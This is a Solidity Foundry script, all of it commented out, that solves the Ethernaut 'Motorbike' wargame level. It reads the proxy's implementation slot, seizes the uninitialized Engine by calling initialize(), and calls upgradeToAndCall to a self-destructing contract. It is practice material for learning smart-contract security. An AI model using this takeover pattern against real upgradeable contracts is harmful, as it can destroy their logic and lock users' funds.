// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/25-Motorbike.sol";

// 
// https://github.com/OpenZeppelin/ethernaut/issues/701
// https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade

//ENGINE_INSTANCE ... cast storage -r $rpc $INSTANCE 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc 






// contract SelfdestructContract {
//     function selfdestructNow(address payable recipient) external {
//         selfdestruct(recipient);
//     }
// }

// contract Exp is Script {
//     Motorbike public motorbikeInstance = Motorbike(payable(0x72A17CF718BC93D14ceff0DC9d09DAb38854a5c5));
//     address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
//     address owner = vm.envAddress("MY_ADDRESS");

//     function attack() public {
    
//         bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
//         address engineAddress = address(uint160(uint256(vm.load(address(motorbikeInstance), implementationSlot))));
        
//         SelfdestructContract selfdestructContract = new SelfdestructContract();

//         Engine engine = Engine(engineAddress);
//         engine.initialize();

//         bytes memory payload = abi.encodeWithSignature("selfdestructNow(address)", payable(owner));
//         engine.upgradeToAndCall(address(selfdestructContract), payload);
//     }

//     function run() external {
//         vm.startBroadcast(hacker);
//         attack();
//         vm.stopBroadcast();
//     }
// }

// contract SelfdestructContract {
//     // 用于销毁 Engine 的合约
//     function destroy() external {
//         selfdestruct(payable(msg.sender));
//     }
// }

// contract Exp is Script {
//     Motorbike public motorbikeInstance = Motorbike(payable(0x17c5A590d1242B71685D8D7c3A9A8fe0C1971CD0));
//     address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
//     address owner = vm.envAddress("MY_ADDRESS"); 

//     function attack() public {
//         console.log("Starting attack...");
//         address engineAddress = getEngineAddress(address(motorbikeInstance));
//         console.log("Engine address:", engineAddress);

//         SelfdestructContract selfdestructInstance = new SelfdestructContract();
//         console.log("Selfdestruct contract deployed at:", address(selfdestructInstance));


//         destroyEngine(engineAddress, address(selfdestructInstance));

//         console.log("Attack complete. Engine should be destroyed.");
//     }

//     function getEngineAddress(address motorbike) internal view returns (address) {
//         // 使用硬编码存储槽测试
//         bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

//         // 检查槽数据是否有效
//         bytes32 rawSlotData = vm.load(motorbike, implementationSlot);
//         console.log("Raw slot data:", uint256(rawSlotData));

//         require(uint256(rawSlotData) != 0, "Invalid slot data: Engine address not found");

//         return address(uint160(uint256(rawSlotData)));
//     }


//     function destroyEngine(address engineAddress, address destroyer) internal {
//         Engine engineInstance = Engine(engineAddress);
//         console.log("Initializing Engine...");
//         engineInstance.initialize();

//         bytes memory destroyCall = abi.encodeWithSignature("destroy()");
//         console.log("Calling upgradeToAndCall...");
//         engineInstance.upgradeToAndCall(destroyer, destroyCall);
//     }

//     function run() external {
//         vm.startBroadcast(hacker);
//         attack();            
//         vm.stopBroadcast();     
//     }
// }



// contract Exp is Script {
//     Motorbike public motorbikeInstance = Motorbike(payable(0x10313a7C12B23933ad2e009Cdf7Ea274AEb9C723)); // Proxy 合约地址
//     address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY")); // 攻击者私钥

//     function attack() public {

//         // bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
//         // address engineAddress = address(uint160(uint256(vm.load(address(motorbikeInstance), implementationSlot))));
//         // console.log("Engine address:", engineAddress);

//         // Killer killer = new Killer();
//         // console.log("Killer contract deployed at:", address(killer));


//         // Engine engine = Engine(engineAddress);
//         // engine.initialize();
//         // console.log("Engine initialized. Current upgrader:", engine.upgrader());

//         // // 调用 upgradeToAndCall 销毁 Engine
//         // bytes memory encodedData = abi.encodeWithSignature("kill()");
//         // engine.upgradeToAndCall(address(killer), encodedData);
//         // console.log("Exploit complete: Engine contract destroyed!");
//     }

//     function run() external {
//         vm.startBroadcast(hacker);
//         attack();
//         vm.stopBroadcast();
//     }
// }
